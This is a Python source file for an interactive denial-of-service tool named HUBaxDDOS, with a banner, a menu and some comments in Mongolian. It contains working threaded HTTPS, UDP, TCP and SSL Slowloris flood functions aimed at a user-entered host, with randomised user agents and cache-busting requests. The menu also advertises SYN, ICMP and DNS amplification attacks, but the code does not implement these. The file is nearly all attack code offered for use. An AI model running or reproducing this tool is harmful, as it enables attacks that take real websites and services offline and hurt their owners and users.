#!/usr/bin/env python3
import socket
import threading
import random
import time
import sys
import ssl
from datetime import datetime
from termcolor import colored

# Configuration
MAX_THREADS = 1000
PACKET_SIZE = 4096
TIMEOUT = 5

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
]

class HUBaxDDOS:
    def __init__(self):
        self.attack_running = False
        self.lock = threading.Lock()
        self.stats = {'packets_sent': 0, 'bytes_sent': 0, 'start_time': None, 'target': None}
        
    def show_logo(self):
        logo = """
╔══════════════════════════════════════════════════════════╗
║  ██╗  ██╗██╗   ██╗██████╗  █████╗ ██╗  ██╗██████╗ ██████╗║
║  ██║  ██║██║   ██║██╔══██╗██╔══██╗╚██╗██╔╝██╔══██╗██╔══██╗║
║  ███████║██║   ██║██████╔╝███████║ ╚███╔╝ ██║  ██║██║  ██║║
║  ██╔══██║██║   ██║██╔══██╗██╔══██║ ██╔██╗ ██║  ██║██║  ██║║
║  ██║  ██║╚██████╔╝██████╔╝██║  ██║██╔╝ ██╗██████╔╝██████╔╝║
╚═══════════════════════ HUBax 2.0 ════════════════════════╝"""
        print(colored(logo, 'cyan'))
        
    def show_menu(self):
        menu = """
  [1] TCP Flood         [5] ICMP Flood (UDP Sim)
  [2] UDP Flood         [6] SSL/Slowloris (High Power)
  [3] HTTPS Flood (443) [7] DNS Amplification
  [4] SYN Flood         [8] Multi-Vector Attack
  [9] Stats  [10] Stop  [11] Help  [12] Exit"""
        print(colored(menu, 'yellow'))

    def update_stats(self, packets, bytes_count):
        with self.lock:
            self.stats['packets_sent'] += packets
            self.stats['bytes_sent'] += bytes_count

    def http_flood(self, url, threads=500, duration=60):
        print(colored(f"[+] Starting High-Power HTTPS Flood on {url}", 'green'))
        target_host = url.replace('http://', '').replace('https://', '').split('/')[0]
        self.attack_running = True
        
        def attack():
            context = ssl.create_default_context()
            end_time = time.time() + duration
            while time.time() < end_time and self.attack_running:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(TIMEOUT)
                    # HTTPS (443) холболт үүсгэх
                    conn = context.wrap_socket(s, server_hostname=target_host)
                    conn.connect((target_host, 443))
                    
                    user_agent = random.choice(USER_AGENTS)
                    req = (f"GET /?{random.randint(1,99999)} HTTP/1.1\r\n"
                           f"Host: {target_host}\r\n"
                           f"User-Agent: {user_agent}\r\n"
                           f"Accept: text/html,application/xhtml+xml\r\n"
                           f"Cache-Control: no-cache\r\n"
                           f"Connection: keep-alive\r\n\r\n").encode()
                    
                    conn.send(req)
                    self.update_stats(1, len(req))
                    print(colored(f"[*] HTTPS Request Sent to {target_host}", 'cyan'))
                    conn.close()
                except: pass

        for _ in range(threads):
            threading.Thread(target=attack, daemon=True).start()

    def udp_flood(self, target_ip, target_port, threads=500, duration=60):
        print(colored(f"[+] Starting UDP Flood on {target_ip}:{target_port}", 'green'))
        self.attack_running = True
        def attack():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random._urandom(PACKET_SIZE)
            end_time = time.time() + duration
            while time.time() < end_time and self.attack_running:
                try:
                    sock.sendto(payload, (target_ip, target_port))
                    self.update_stats(1, PACKET_SIZE)
                    print(colored(f"[*] UDP Packet Sent to {target_ip}", 'magenta'))
                except: pass
        for _ in range(threads):
            threading.Thread(target=attack, daemon=True).start()

    def slowloris(self, url, threads=400, duration=60):
        print(colored(f"[+] Starting SSL Slowloris on {url}", 'green'))
        target_host = url.replace('http://', '').replace('https://', '').split('/')[0]
        self.attack_running = True
        
        def attack():
            context = ssl.create_default_context()
            sockets = []
            end_time = time.time() + duration
            try:
                while time.time() < end_time and self.attack_running:
                    if len(sockets) < threads:
                        try:
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            conn = context.wrap_socket(s, server_hostname=target_host)
                            conn.connect((target_host, 443))
                            conn.send(f"GET /?{random.randint(1, 5000)} HTTP/1.1\r\n".encode())
                            conn.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode())
                            sockets.append(conn)
                            print(colored(f"[*] SSL Session Opened: {target_host}", 'white'))
                        except: pass
                    
                    for s in sockets:
                        try:
                            s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                            print(colored(f"[*] Keep-alive sent to {target_host}", 'blue'))
                        except: sockets.remove(s)
                    time.sleep(10)
            except: pass

        threading.Thread(target=attack, daemon=True).start()

    # Бусад стандарт функцуудыг энд товчлон үлдээв (өмнөх кодоос авна)
    def tcp_flood(self, target_ip, target_port, threads=500, duration=60):
        self.attack_running = True
        def attack():
            end_time = time.time() + duration
            while time.time() < end_time and self.attack_running:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((target_ip, target_port))
                    s.send(random._urandom(1024))
                    print(colored(f"[*] TCP Sent to {target_ip}", 'blue'))
                    s.close()
                except: pass
        for _ in range(threads): threading.Thread(target=attack, daemon=True).start()

    def stop_attack(self):
        self.attack_running = False
        print(colored("\n[!] Stopping all threads...", 'red'))

    def interactive_mode(self):
        self.show_logo()
        self.show_menu()
        while True:
            try:
                cmd = input(colored("\nHUBaxDDOS> ", 'white')).strip()
                if cmd == '12': break
                elif cmd == '10': self.stop_attack()
                elif cmd == '3':
                    target = input("Target URL (example.com): ")
                    self.stats['target'] = target
                    self.http_flood(target)
                elif cmd == '2':
                    ip = input("Target IP: ")
                    port = int(input("Port: "))
                    self.udp_flood(ip, port)
                elif cmd == '6':
                    target = input("Target URL (example.com): ")
                    self.slowloris(target)
                elif cmd == '8': # Multi-Vector
                    ip = input("Target IP: ")
                    self.udp_flood(ip, 443)
                    self.tcp_flood(ip, 443)
                else: print("Select 1-12 from menu.")
            except KeyboardInterrupt: break
            except Exception as e: print(f"Error: {e}")

if __name__ == "__main__":
    HUBaxDDOS().interactive_mode()
